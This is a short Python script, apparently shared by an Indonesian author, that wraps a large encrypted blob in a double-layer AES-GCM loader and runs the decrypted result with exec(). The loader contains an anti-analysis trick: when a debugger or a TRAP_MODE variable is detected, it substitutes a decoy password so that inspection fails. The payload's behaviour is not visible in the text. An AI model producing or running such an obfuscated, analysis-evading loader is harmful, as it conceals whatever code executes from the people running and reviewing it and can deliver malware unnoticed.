#!/usr/bin/env python3
#yang nyopet script semoga yatim kalo udah semoga orang nya aja gpp hehe 99x
#yang mau script nya di encrypt seperti ini chat pribadi saja

import os, sys, base64, zlib
from Crypto.Protocol.KDF import scrypt
from Crypto.Cipher import AES

def decrypt_code(enc, password):
    try:
        raw = base64.b64decode(enc)
        salt2 = raw[:32]
        nonce2 = raw[32:44]
        tag2 = raw[44:60]
        ciphertext2 = raw[60:]
        key2 = scrypt(password, salt2, key_len=32, N=131072, r=8, p=2)
        cipher2 = AES.new(key2, AES.MODE_GCM, nonce=nonce2)
        first_layer = cipher2.decrypt_and_verify(ciphertext2, tag2)
        salt1 = first_layer[:32]
        nonce1 = first_layer[32:44]
        tag1 = first_layer[44:60]
        ciphertext1 = first_layer[60:]
        key1 = scrypt(password, salt1, key_len=32, N=131072, r=8, p=2)
        cipher1 = AES.new(key1, AES.MODE_GCM, nonce=nonce1)
        compressed = cipher1.decrypt_and_verify(ciphertext1, tag1)
        decrypted = zlib.decompress(compressed).decode()
        return decrypted
    except Exception:
        print("Hayoo lohh, lagi ngapain lu di sini hah???.")
        sys.exit(1)

def get_decryption_password():
    if sys.gettrace() is not None or os.getenv("TRAP_MODE") == "1":
        return "decoy_password"
    part1 = "password(ObfusCation_tripel_enc"
    part2 = "rypt) - Double Encrypted Edition"
    return part1 + part2

if __name__ == '__main__':
    password = get_decryption_password()
    encrypted_data = "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"
    code = decrypt_code(encrypted_data, password)
    exec(code)
